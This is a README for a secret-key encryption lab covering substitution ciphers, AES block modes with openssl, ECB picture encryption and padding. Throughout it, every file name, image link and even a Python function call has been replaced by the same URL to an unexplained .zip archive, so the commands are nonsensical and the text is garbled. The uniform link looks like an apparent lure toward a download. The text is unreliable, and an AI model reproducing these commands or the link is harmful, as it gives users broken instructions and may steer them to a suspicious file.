# Secret-Key-Encryption-Lab
# Task 1

touch https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip

  echo "This Is a Plain Text Which Is Converted into Cipher Text Using Subtitution" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip

![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip) 

  tr [:upper:] [:lower:] < https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip
  tr -cd ’[a-z][\n][:space:]’ < https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip

![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip) 

  
  >>> import random
  >>> s = "abcdefghijklmnopqrstuvwxyz"
  >>> ''.join(https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip(s,len(s)))
  'jyqsfotweaurdlxkzgcbpnvhmi  


![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip) 

      tr ’abcdefghijklmnopqrstuvwxyz’ ’jyqsfotweaurdlxkzgcbpnvhmi’ < https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip
      tr ’jyqsfotweaurdlxkzgcbpnvhmi’ ’abcdefghijklmnopqrstuvwxyz’ < https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip
  
![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)


# Task 2
*Cipher Block Chaining (CBC)*
Each block of plaintext is XORed with the previous cipher block.

![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)

          #encrypt
          $openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
          -K 00112233445566778889aabbccddeeff \
          -iv 0102030405060708
          #decrypt
          $openssl enc  -aes-128-cbc  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
          -K 00112233445566778889aabbccddeeff \
          -iv 0102030405060708
          #valid

*Cipher Feedback (CFB)*
The ciphertext from the previous block is fed into the block cipher for encryption, and the output of the encryption is XORed with the plaintext to generate the actual ciphertext.

          #encrypt
          $openssl enc  -aes-128-cfb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
          -K 00112233445566778889aabbccddeeff \
          -iv 0102030405060708
          #decrypt
          $openssl enc  -aes-128-cfb  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
          -K 00112233445566778889aabbccddeeff \
          -iv 0102030405060708
          #valid
          $diff https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip
          
![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)


*Output Feedback (OFB)*
Similar to CFB, except that the data before (while in CFB, it should be "after") the XOR operation is fed into the next block.

          #encrypt
          $openssl enc  -aes-128-ofb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
          -K 00112233445566778889aabbccddeeff \
          -iv 0102030405060708
          #decrypt
          $openssl enc  -aes-128-ofb  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
          -K 00112233445566778889aabbccddeeff \
          -iv 0102030405060708
          #valid
          $diff https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip

![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)


*Counter (CTR)*
Each block of key stream is generated by encrypting the counter value for the block. Nonce servers as IV, increased by some value (no need to be fixed to 1 ) as a counter.

          #encrypt
          $openssl enc  -aes-128-ctr  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
          -K 00112233445566778889aabbccddeeff \
          -iv 0102030405060708
          #decrypt
          $openssl enc  -aes-128-ctr  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
          -K 00112233445566778889aabbccddeeff \
          -iv 0102030405060708
          #valid
          $diff https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip
          
# Task 3

          openssl enc  -aes-128-ecb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
          -K 00112233445566778889aabbccddeeff
          Reset the header of the encrypted picture to make it openable by picture viewer:

          head -c 54 https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip > header
          tail -c +55 https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip > body
          cat header body > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip

![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)


# Task 4

echo -n "123456" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip
ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip
openssl enc  -aes-128-ecb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff
ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip 
![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)

# cbc
openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff \
-iv 0102030405060708
ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip # 16
![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)          

# cfb
openssl enc  -aes-128-cfb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff \
-iv 0102030405060708
ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip #5
![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)

# ofb
openssl enc  -aes-128-ofb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff \
-iv 0102030405060708
ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip #5


        echo -n "12345" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip # 5 bytes
        echo -n "123456789A" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip # 10 bytes
        echo -n "0123456789ABCDEF" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip # 16 bytes


openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff \
-iv 0102030405060708
ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip


openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff \
-iv 0102030405060708
ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip


openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff \
-iv 0102030405060708
ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip

![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)

openssl enc  -aes-128-cbc  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff \
-iv 0102030405060708 -nopad


      $python -c "print '1234567890'*100" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip
      $-ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip

![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)

openssl enc  -aes-128-ecb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff 

![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)

openssl enc  -aes-128-ecb  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip \
-K 00112233445566778889aabbccddeeff 

![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Secret_Lab_Encryption_v3.8.zip)
